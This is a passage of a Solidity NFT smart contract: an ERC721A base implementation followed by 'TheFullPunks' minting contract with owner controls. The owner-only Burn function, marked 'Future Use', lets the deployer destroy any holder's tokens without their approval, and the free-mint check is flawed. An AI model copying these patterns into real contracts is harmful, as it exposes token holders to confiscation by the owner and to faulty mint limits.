931                     // There will always be an ownership that has an address and is not burned
932                     // before an ownership that does not have an address and is not burned.
933                     // Hence, curr will not underflow.
934                     while (true) {
935                         curr--;
936                         ownership = _ownerships[curr];
937                         if (ownership.addr != address(0)) {
938                             return ownership;
939                         }
940                     }
941                 }
942             }
943         }
944         revert OwnerQueryForNonexistentToken();
945     }
946 
947     /**
948      * @dev See {IERC721-ownerOf}.
949      */
950     function ownerOf(uint256 tokenId) public view override returns (address) {
951         return ownershipOf(tokenId).addr;
952     }
953 
954     /**
955      * @dev See {IERC721Metadata-name}.
956      */
957     function name() public view virtual override returns (string memory) {
958         return _name;
959     }
960 
961     /**
962      * @dev See {IERC721Metadata-symbol}.
963      */
964     function symbol() public view virtual override returns (string memory) {
965         return _symbol;
966     }
967 
968     /**
969      * @dev See {IERC721Metadata-tokenURI}.
970      */
971     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
972         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
973 
974         string memory baseURI = _baseURI();
975         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
976     }
977 
978     /**
979      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
980      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
981      * by default, can be overriden in child contracts.
982      */
983     function _baseURI() internal view virtual returns (string memory) {
984         return '';
985     }
986 
987     /**
988      * @dev See {IERC721-approve}.
989      */
990     function approve(address to, uint256 tokenId) public override {
991         address owner = ERC721A.ownerOf(tokenId);
992         if (to == owner) revert ApprovalToCurrentOwner();
993 
994         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
995             revert ApprovalCallerNotOwnerNorApproved();
996         }
997 
998         _approve(to, tokenId, owner);
999     }
1000 
1001     /**
1002      * @dev See {IERC721-getApproved}.
1003      */
1004     function getApproved(uint256 tokenId) public view override returns (address) {
1005         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1006 
1007         return _tokenApprovals[tokenId];
1008     }
1009 
1010     /**
1011      * @dev See {IERC721-setApprovalForAll}.
1012      */
1013     function setApprovalForAll(address operator, bool approved) public override {
1014         if (operator == _msgSender()) revert ApproveToCaller();
1015 
1016         _operatorApprovals[_msgSender()][operator] = approved;
1017         emit ApprovalForAll(_msgSender(), operator, approved);
1018     }
1019 
1020     /**
1021      * @dev See {IERC721-isApprovedForAll}.
1022      */
1023     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1024         return _operatorApprovals[owner][operator];
1025     }
1026 
1027     /**
1028      * @dev See {IERC721-transferFrom}.
1029      */
1030     function transferFrom(
1031         address from,
1032         address to,
1033         uint256 tokenId
1034     ) public virtual override {
1035         _transfer(from, to, tokenId);
1036     }
1037 
1038     /**
1039      * @dev See {IERC721-safeTransferFrom}.
1040      */
1041     function safeTransferFrom(
1042         address from,
1043         address to,
1044         uint256 tokenId
1045     ) public virtual override {
1046         safeTransferFrom(from, to, tokenId, '');
1047     }
1048 
1049     /**
1050      * @dev See {IERC721-safeTransferFrom}.
1051      */
1052     function safeTransferFrom(
1053         address from,
1054         address to,
1055         uint256 tokenId,
1056         bytes memory _data
1057     ) public virtual override {
1058         _transfer(from, to, tokenId);
1059         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1060             revert TransferToNonERC721ReceiverImplementer();
1061         }
1062     }
1063 
1064     /**
1065      * @dev Returns whether `tokenId` exists.
1066      *
1067      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1068      *
1069      * Tokens start existing when they are minted (`_mint`),
1070      */
1071     function _exists(uint256 tokenId) internal view returns (bool) {
1072         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1073             !_ownerships[tokenId].burned;
1074     }
1075 
1076     function _safeMint(address to, uint256 quantity) internal {
1077         _safeMint(to, quantity, '');
1078     }
1079 
1080     /**
1081      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1082      *
1083      * Requirements:
1084      *
1085      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1086      * - `quantity` must be greater than 0.
1087      *
1088      * Emits a {Transfer} event.
1089      */
1090     function _safeMint(
1091         address to,
1092         uint256 quantity,
1093         bytes memory _data
1094     ) internal {
1095         _mint(to, quantity, _data, true);
1096     }
1097 
1098     /**
1099      * @dev Mints `quantity` tokens and transfers them to `to`.
1100      *
1101      * Requirements:
1102      *
1103      * - `to` cannot be the zero address.
1104      * - `quantity` must be greater than 0.
1105      *
1106      * Emits a {Transfer} event.
1107      */
1108     function _mint(
1109         address to,
1110         uint256 quantity,
1111         bytes memory _data,
1112         bool safe
1113     ) internal {
1114         uint256 startTokenId = _currentIndex;
1115         if (to == address(0)) revert MintToZeroAddress();
1116         if (quantity == 0) revert MintZeroQuantity();
1117 
1118         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1119 
1120         // Overflows are incredibly unrealistic.
1121         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1122         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1123         unchecked {
1124             _addressData[to].balance += uint64(quantity);
1125             _addressData[to].numberMinted += uint64(quantity);
1126 
1127             _ownerships[startTokenId].addr = to;
1128             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1129 
1130             uint256 updatedIndex = startTokenId;
1131             uint256 end = updatedIndex + quantity;
1132 
1133             if (safe && to.isContract()) {
1134                 do {
1135                     emit Transfer(address(0), to, updatedIndex);
1136                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1137                         revert TransferToNonERC721ReceiverImplementer();
1138                     }
1139                 } while (updatedIndex != end);
1140                 // Reentrancy protection
1141                 if (_currentIndex != startTokenId) revert();
1142             } else {
1143                 do {
1144                     emit Transfer(address(0), to, updatedIndex++);
1145                 } while (updatedIndex != end);
1146             }
1147             _currentIndex = updatedIndex;
1148         }
1149         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1150     }
1151 
1152     /**
1153      * @dev Transfers `tokenId` from `from` to `to`.
1154      *
1155      * Requirements:
1156      *
1157      * - `to` cannot be the zero address.
1158      * - `tokenId` token must be owned by `from`.
1159      *
1160      * Emits a {Transfer} event.
1161      */
1162     function _transfer(
1163         address from,
1164         address to,
1165         uint256 tokenId
1166     ) private {
1167         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1168 
1169         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1170             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1171             getApproved(tokenId) == _msgSender());
1172 
1173         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1174         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1175         if (to == address(0)) revert TransferToZeroAddress();
1176 
1177         _beforeTokenTransfers(from, to, tokenId, 1);
1178 
1179         // Clear approvals from the previous owner
1180         _approve(address(0), tokenId, prevOwnership.addr);
1181 
1182         // Underflow of the sender's balance is impossible because we check for
1183         // ownership above and the recipient's balance can't realistically overflow.
1184         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1185         unchecked {
1186             _addressData[from].balance -= 1;
1187             _addressData[to].balance += 1;
1188 
1189             _ownerships[tokenId].addr = to;
1190             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1191 
1192             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1193             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1194             uint256 nextTokenId = tokenId + 1;
1195             if (_ownerships[nextTokenId].addr == address(0)) {
1196                 // This will suffice for checking _exists(nextTokenId),
1197                 // as a burned slot cannot contain the zero address.
1198                 if (nextTokenId < _currentIndex) {
1199                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1200                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1201                 }
1202             }
1203         }
1204 
1205         emit Transfer(from, to, tokenId);
1206         _afterTokenTransfers(from, to, tokenId, 1);
1207     }
1208 
1209     /**
1210      * @dev Destroys `tokenId`.
1211      * The approval is cleared when the token is burned.
1212      *
1213      * Requirements:
1214      *
1215      * - `tokenId` must exist.
1216      *
1217      * Emits a {Transfer} event.
1218      */
1219     function _burn(uint256 tokenId) internal virtual {
1220         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1221 
1222         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1223 
1224         // Clear approvals from the previous owner
1225         _approve(address(0), tokenId, prevOwnership.addr);
1226 
1227         // Underflow of the sender's balance is impossible because we check for
1228         // ownership above and the recipient's balance can't realistically overflow.
1229         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1230         unchecked {
1231             _addressData[prevOwnership.addr].balance -= 1;
1232             _addressData[prevOwnership.addr].numberBurned += 1;
1233 
1234             // Keep track of who burned the token, and the timestamp of burning.
1235             _ownerships[tokenId].addr = prevOwnership.addr;
1236             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1237             _ownerships[tokenId].burned = true;
1238 
1239             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1240             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1241             uint256 nextTokenId = tokenId + 1;
1242             if (_ownerships[nextTokenId].addr == address(0)) {
1243                 // This will suffice for checking _exists(nextTokenId),
1244                 // as a burned slot cannot contain the zero address.
1245                 if (nextTokenId < _currentIndex) {
1246                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1247                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1248                 }
1249             }
1250         }
1251 
1252         emit Transfer(prevOwnership.addr, address(0), tokenId);
1253         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1254 
1255         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1256         unchecked {
1257             _burnCounter++;
1258         }
1259     }
1260 
1261     /**
1262      * @dev Approve `to` to operate on `tokenId`
1263      *
1264      * Emits a {Approval} event.
1265      */
1266     function _approve(
1267         address to,
1268         uint256 tokenId,
1269         address owner
1270     ) private {
1271         _tokenApprovals[tokenId] = to;
1272         emit Approval(owner, to, tokenId);
1273     }
1274 
1275     /**
1276      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1277      *
1278      * @param from address representing the previous owner of the given token ID
1279      * @param to target address that will receive the tokens
1280      * @param tokenId uint256 ID of the token to be transferred
1281      * @param _data bytes optional data to send along with the call
1282      * @return bool whether the call correctly returned the expected magic value
1283      */
1284     function _checkContractOnERC721Received(
1285         address from,
1286         address to,
1287         uint256 tokenId,
1288         bytes memory _data
1289     ) private returns (bool) {
1290         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1291             return retval == IERC721Receiver(to).onERC721Received.selector;
1292         } catch (bytes memory reason) {
1293             if (reason.length == 0) {
1294                 revert TransferToNonERC721ReceiverImplementer();
1295             } else {
1296                 assembly {
1297                     revert(add(32, reason), mload(reason))
1298                 }
1299             }
1300         }
1301     }
1302 
1303     /**
1304      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1305      * And also called before burning one token.
1306      *
1307      * startTokenId - the first token id to be transferred
1308      * quantity - the amount to be transferred
1309      *
1310      * Calling conditions:
1311      *
1312      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1313      * transferred to `to`.
1314      * - When `from` is zero, `tokenId` will be minted for `to`.
1315      * - When `to` is zero, `tokenId` will be burned by `from`.
1316      * - `from` and `to` are never both zero.
1317      */
1318     function _beforeTokenTransfers(
1319         address from,
1320         address to,
1321         uint256 startTokenId,
1322         uint256 quantity
1323     ) internal virtual {}
1324 
1325     /**
1326      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1327      * minting.
1328      * And also called after one token has been burned.
1329      *
1330      * startTokenId - the first token id to be transferred
1331      * quantity - the amount to be transferred
1332      *
1333      * Calling conditions:
1334      *
1335      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1336      * transferred to `to`.
1337      * - When `from` is zero, `tokenId` has been minted for `to`.
1338      * - When `to` is zero, `tokenId` has been burned by `from`.
1339      * - `from` and `to` are never both zero.
1340      */
1341     function _afterTokenTransfers(
1342         address from,
1343         address to,
1344         uint256 startTokenId,
1345         uint256 quantity
1346     ) internal virtual {}
1347 }
1348 
1349 
1350 
1351 contract TheFullPunks is ERC721A, Owneable {
1352 
1353     string public baseURI = "ipfs://QmRcduk7HxnGyQ8PUJGEoj54o54hifQbqAcvmgQ4tAW6Pf/";
1354     string public contractURI = "ipfs://QmSjqfWU7eoC3tGSw1YYofnqaEnStyiCgcTBkEjjHouyBG";
1355     string public baseExtension = ".json";
1356     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1357 
1358     uint256 public constant MAX_PER_TX_FREE = 10;
1359     uint256 public free_max_supply = 1;
1360     uint256 public constant MAX_PER_TX = 10;
1361     uint256 public max_supply = 5000;
1362     uint256 public price = 0.001 ether;
1363 
1364     bool public paused = true;
1365 
1366     constructor() ERC721A("The Full Punks", "Fpunks") {}
1367 
1368     function PublicMint(uint256 _amount) external payable {
1369         address _caller = _msgSender();
1370         require(!paused, "Paused");
1371         require(max_supply >= totalSupply() + _amount, "Exceeds max supply");
1372         require(_amount > 0, "No 0 mints");
1373         require(tx.origin == _caller, "No contracts");
1374         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1375         
1376       if(free_max_supply >= totalSupply()){
1377             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1378         }else{
1379             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1380             require(_amount * price == msg.value, "Invalid funds provided");
1381         }
1382 
1383 
1384         _safeMint(_caller, _amount);
1385     }
1386 
1387 
1388 
1389   
1390 
1391     function isApprovedForAll(address owner, address operator)
1392         override
1393         public
1394         view
1395         returns (bool)
1396     {
1397         // Whitelist OpenSea proxy contract for easy trading.
1398         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1399         if (address(proxyRegistry.proxies(owner)) == operator) {
1400             return true;
1401         }
1402 
1403         return super.isApprovedForAll(owner, operator);
1404     }
1405 
1406     function Withdraw() external onlyOwner {
1407         uint256 balance = address(this).balance;
1408         (bool success, ) = _msgSender().call{value: balance}("");
1409         require(success, "Failed to send");
1410     }
1411 
1412     function WhitelistMint(uint256 quantity) external onlyOwner {
1413         _safeMint(_msgSender(), quantity);
1414     }
1415 
1416 
1417     function pause(bool _state) external onlyOwner {
1418         paused = _state;
1419     }
1420 
1421     function setBaseURI(string memory baseURI_) external onlyOwner {
1422         baseURI = baseURI_;
1423     }
1424 
1425     function setContractURI(string memory _contractURI) external onlyOwner {
1426         contractURI = _contractURI;
1427     }
1428 
1429     function configPrice(uint256 newPrice) public onlyOwner {
1430         price = newPrice;
1431     }
1432 
1433     function configmax_supply(uint256 newSupply) public onlyOwner {
1434         max_supply = newSupply;
1435     }
1436 
1437     function configfree_max_supply(uint256 newFreesupply) public onlyOwner {
1438         free_max_supply = newFreesupply;
1439     }
1440 
1441     function newbaseExtension(string memory newex) public onlyOwner {
1442         baseExtension = newex;
1443     }
1444 
1445 
1446 //Future Use
1447         function Burn(uint256[] memory tokenids) external onlyOwner {
1448         uint256 len = tokenids.length;
1449         for (uint256 i; i < len; i++) {
1450             uint256 tokenid = tokenids[i];
1451             _burn(tokenid);
1452         }
1453     }
1454 
1455 
1456     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1457         require(_exists(_tokenId), "Token does not exist.");
1458         return bytes(baseURI).length > 0 ? string(
1459             abi.encodePacked(
1460               baseURI,
1461               Strings.toString(_tokenId),
1462               baseExtension
1463             )
1464         ) : "";
1465     }
1466 }
1467 
1468 contract OwnableDelegateProxy { }
1469 contract ProxyRegistry {
1470     mapping(address => OwnableDelegateProxy) public proxies;
1471 }